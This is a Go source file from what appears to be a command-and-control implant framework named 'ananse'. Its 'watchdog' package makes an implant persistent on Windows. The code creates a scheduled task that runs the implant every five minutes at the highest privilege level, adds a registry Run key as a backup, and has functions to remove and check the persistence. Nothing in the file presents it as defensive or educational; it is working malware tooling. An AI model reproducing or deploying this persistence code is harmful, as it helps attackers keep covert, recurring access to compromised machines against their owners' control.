package watchdog

import (
	"fmt"

	"github.com/natx6/ananse/src/c2/implant/shell"
)

func installImpl(path string) error {
	// Use Windows Scheduled Task for persistence
	cmd := fmt.Sprintf(`schtasks /Create /F /SC MINUTE /MO 5 /TN "AnanseImplant" /TR "%s" /RL HIGHEST`, path)
	_, err := shell.Run(cmd, 15e9)
	if err != nil {
		return fmt.Errorf("schtasks create: %w", err)
	}

	// Also add a Run registry key as backup
	regCmd := fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v AnanseImplant /t REG_SZ /d "%s" /f`, path)
	_, _ = shell.Run(regCmd, 10e9)

	return nil
}

func removeImpl() error {
	_, _ = shell.Run("schtasks /Delete /F /TN \"AnanseImplant\" 2>nul", 10e9)
	_, _ = shell.Run("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v AnanseImplant /f 2>nul", 10e9)
	return nil
}

func isPersistentImpl() bool {
	out, _ := shell.Run("schtasks /Query /TN \"AnanseImplant\" 2>nul", 10e9)
	return out != ""
}
